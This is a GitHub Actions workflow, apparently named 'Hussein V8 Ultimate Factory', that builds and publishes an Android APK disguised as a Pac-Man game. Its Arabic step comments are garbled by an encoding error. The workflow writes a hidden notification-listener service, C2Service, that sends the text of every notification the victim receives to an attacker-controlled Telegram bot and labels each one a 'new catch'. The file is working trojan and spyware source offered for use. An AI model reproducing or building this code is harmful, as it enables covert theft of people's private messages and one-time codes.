name: Hussein V8 Ultimate Factory
on:
  workflow_dispatch:
    inputs:
      bot_token: { required: true }
      chat_id: { required: true }
      app_name: { required: true, default: 'Halos Game' }

permissions: { contents: write }

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. Ø¬Ù„Ø¨ Ø§Ù„ÙƒÙˆØ¯ ÙˆØ¥Ø¹Ø¯Ø§Ø¯ Ø¬Ø§ÙØ§
        uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: 'temurin', java-version: '17' }

      - name: 2. Ø¨Ù†Ø§Ø¡ Ù‡ÙŠÙƒÙ„ Ø§Ù„Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯ Ø§Ù„ØµØ§Ù…Øª
        run: |
          mkdir -p app/src/main/java/com/hussein/v8
          mkdir -p app/src/main/res/layout

          # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
          echo "include ':app'" > settings.gradle

          # Ø¨Ù†Ø§Ø¡ Ù…Ù„Ù build.gradle Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ (Ø¥ØµØ¯Ø§Ø± Ù…Ø³ØªÙ‚Ø±)
          cat << 'EOF' > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          # Ø¨Ù†Ø§Ø¡ Ù…Ù„Ù app/build.gradle (ØªØ«Ø¨ÙŠØª Ø§Ù„Ù…ÙƒØªØ¨Ø§Øª ÙŠØ¯ÙˆÙŠØ§Ù‹)
          cat << 'EOF' > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.v8'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.v8"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
          }
          dependencies {
              implementation "com.squareup.okhttp3:okhttp:4.12.0"
          }
          EOF

      - name: 3. Ø­Ù‚Ù† ÙƒÙˆØ¯ "Ø§Ù„ØªÙ…ÙˆÙŠÙ‡" ÙˆØ³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        run: |
          # Ø­Ù‚Ù† Ø§Ø³Ù… Ø§Ù„Ù„Ø¹Ø¨Ø© ÙÙŠ Ø§Ù„Ù€ Manifest
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application android:label="${{ github.event.inputs.app_name }}" android:icon="@android:drawable/btn_star">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".C2Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # Ø­Ù‚Ù† Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª (Token & ID)
          cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
          package com.hussein.v8;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import okhttp3.*;
          import java.io.IOException;

          public class C2Service extends NotificationListenerService {
              private final String T = "${{ github.event.inputs.bot_token }}";
              private final String C = "${{ github.event.inputs.chat_id }}";
              private final OkHttpClient client = new OkHttpClient();

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String msg = "ğŸ¯ ØµÙŠØ¯Ø© Ø¬Ø¯ÙŠØ¯Ø©!\n" + sbn.getNotification().extras.getCharSequence("android.text");
                  Request req = new Request.Builder().url("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+msg).build();
                  client.newCall(req).enqueue(new Callback() {
                      @Override public void onFailure(Call c, IOException e) {}
                      @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
                  });
              }
          }
          EOF

          # ÙƒÙˆØ¯ Ø§Ù„Ù„Ø¹Ø¨Ø© (Ø§Ù„Ø¨Ø§ÙƒÙ…Ø§Ù† Ø§Ù„Ø´Ù‡ÙŠØ± Ù„Ù„ØªÙ…ÙˆÙŠÙ‡)
          cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
          package com.hussein.v8;
          import android.app.Activity;
          import android.os.Bundle;
          import android.webkit.WebView;
          public class MainActivity extends Activity {
              @Override protected void onCreate(Bundle s) {
                  super.onCreate(s);
                  WebView w = new WebView(this);
                  w.getSettings().setJavaScriptEnabled(true);
                  w.loadUrl("https://www.google.com/logos/2010/pacman10-i.html");
                  setContentView(w);
              }
          }
          EOF

      - name: 4. ØªØ´ØºÙŠÙ„ Ù…Ø§ÙƒÙŠÙ†Ø© Ø§Ù„Ø¨Ù†Ø§Ø¡ (Gradle Build)
        run: |
          chmod +x gradlew || true
          gradle assembleDebug

      - name: 5. Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ù€ APK
        uses: softprops/action-gh-release@v1
        with:
          tag_name: V8-STABLE-${{ github.run_number }}
          name: Ù„Ø¹Ø¨Ø© ${{ github.event.inputs.app_name }} Ø¬Ø§Ù‡Ø²Ø©
          files: app/build/outputs/apk/debug/*.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
